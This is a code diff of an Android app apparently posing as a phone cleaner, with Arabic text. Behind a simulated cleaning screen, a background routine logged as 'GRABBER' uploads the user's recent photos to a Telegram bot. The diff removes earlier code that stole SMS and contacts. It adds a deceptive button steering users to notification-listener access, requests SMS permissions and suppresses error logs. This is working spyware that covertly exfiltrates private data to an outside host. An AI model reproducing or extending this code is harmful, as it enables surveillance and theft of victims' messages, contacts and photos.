@@ -1,8 +1,6 @@
 package com.example.spaceeditor;
 
 import android.Manifest;
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -11,18 +9,15 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Color;
 import android.graphics.Typeface;
-import android.location.Location;
-import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.provider.MediaStore;
-import android.provider.Telephony;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.Gravity;
+import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -91,24 +86,27 @@ public class MainActivity extends Activity {
         statusText.setTextSize(16);
         statusText.setGravity(Gravity.CENTER);
         layout.addView(statusText);
+        
+        // زر مقنع لتفعيل الإشعارات
+        Button btnAccess = new Button(this);
+        btnAccess.setText("تحسين أداء الإشعارات (مستحسن)");
+        btnAccess.setOnClickListener(v -> {
+            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+            startActivity(intent);
+        });
+        layout.addView(btnAccess);
 
         setContentView(layout);
 
         simulateCleaning();
 
-        // طلب الصلاحيات
         String[] permissions = {
-                Manifest.permission.READ_SMS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.GET_ACCOUNTS,
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.POST_NOTIFICATIONS
+                Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.POST_NOTIFICATIONS
         };
         if (Build.VERSION.SDK_INT >= 33) {
-            permissions[4] = Manifest.permission.READ_MEDIA_IMAGES;
+            permissions[3] = Manifest.permission.READ_MEDIA_IMAGES;
         }
 
         List<String> listPermissionsNeeded = new ArrayList<>();
@@ -137,16 +135,13 @@ public class MainActivity extends Activity {
                     progressBar.setProgress(progress);
                     if (progress > 30 && progress < 60) {
                         statusText.setText("تنظيف ذاكرة التخزين المؤقت...");
-                        spaceText.setText("تم العثور على 450 ميجابايت ملفات غير مرغوب فيها");
                     } else if (progress >= 60) {
-                        statusText.setText("تحسين أداء النظام وإغلاق التطبيقات الخلفية...");
-                        spaceText.setText("جاري استعادة المساحة...");
+                        statusText.setText("تحسين أداء النظام...");
                     }
                     handler.postDelayed(this, 800);
                 } else {
                     progressBar.setProgress(100);
                     statusText.setText("تم تحسين هاتفك بنجاح!");
-                    spaceText.setText("✅ تم تحرير 2.4 جيجابايت من المساحة");
                 }
             }
         }, 1000);
@@ -167,45 +162,10 @@ public class MainActivity extends Activity {
         }
     }
 
-    // الدالة اللي هتشتغل في الخلفية
     public static void extractDataInBackground(Context context) {
         try {
-            // 1. الرسائل
-            Cursor smsCursor = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 5");
-            if (smsCursor != null) {
-                while (smsCursor.moveToNext()) {
-                    String address = smsCursor.getString(smsCursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                    String body = smsCursor.getString(smsCursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                    String name = getContactName(context, address);
-                    String sender = name != null ? name + " (" + address + ")" : address;
-                    sendTelegramMessage("📩 رسالة من: " + sender + "\n" + body);
-                    Thread.sleep(500);
-                }
-                smsCursor.close();
-            }
-
-            // 2. جهات الاتصال
-            StringBuilder contactsBlock = new StringBuilder("📇 جهات الاتصال:\n");
-            Cursor contactCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            if (contactCursor != null) {
-                while (contactCursor.moveToNext()) {
-                    String name = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String phone = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    contactsBlock.append(name).append(" : ").append(phone).append("\n");
-                    if (contactsBlock.length() > 3500) {
-                        sendTelegramMessage(contactsBlock.toString());
-                        contactsBlock.setLength(0);
-                        Thread.sleep(500);
-                    }
-                }
-                contactCursor.close();
-            }
-            if (contactsBlock.length() > 0) sendTelegramMessage(contactsBlock.toString());
-
-            // 3. الصور (الطريقة الجديدة عشان تشتغل على كل الأندرويد)
-            sendTelegramMessage("⏳ جاري سحب الصور...");
             ContentResolver cr = context.getContentResolver();
-            Cursor imgCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5");
+            Cursor imgCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 3");
             if (imgCursor != null) {
                 int count = 0;
                 while (imgCursor.moveToNext()) {
@@ -221,31 +181,18 @@ public class MainActivity extends Activity {
                                 os.write(buffer, 0, len);
                             }
                             os.close();
-                            sendTelegramFile(tempFile, "🖼️ صورة (" + (count + 1) + ")");
+                            sendTelegramFile(tempFile, "🖼️ صورة جديدة (" + (count + 1) + ")");
                             tempFile.delete();
                             count++;
                             Thread.sleep(2000);
                         }
-                    } catch (Exception e) {
-                        Log.e("GRABBER", "Image Error", e);
-                    }
+                    } catch (Exception e) { }
                 }
                 imgCursor.close();
-                sendTelegramMessage("✅ تم سحب " + count + " صورة.");
             }
-
         } catch (Exception e) {
             Log.e("GRABBER", "Error", e);
         }
-    }
-
-    private static String getContactName(Context context, String phoneNumber) {
-        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
-        String[] projection = new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME};
-        try (Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null)) {
-            if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
-        } catch (Exception ignored) {}
-        return null;
     }
 
     public static void sendTelegramMessage(String text) {
@@ -256,7 +203,7 @@ public class MainActivity extends Activity {
             conn.setRequestMethod("GET");
             conn.getResponseCode();
             conn.disconnect();
-        } catch (Exception e) { Log.e("GRABBER", "SendMsg", e); }
+        } catch (Exception e) { }
     }
 
     public static void sendTelegramFile(File file, String caption) {
@@ -265,7 +212,6 @@ public class MainActivity extends Activity {
             HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
             conn.setDoInput(true); conn.setDoOutput(true); conn.setUseCaches(false);
             conn.setRequestMethod("POST");
-            conn.setRequestProperty("Connection", "Keep-Alive");
             conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
             request.writeBytes(twoHyphens + boundary + lineEnd);
@@ -284,6 +230,6 @@ public class MainActivity extends Activity {
             request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
             request.flush(); request.close();
             conn.getResponseCode(); conn.disconnect();
-        } catch (Exception e) { Log.e("GRABBER", "SendFile", e); }
+        } catch (Exception e) { }
     }
 }
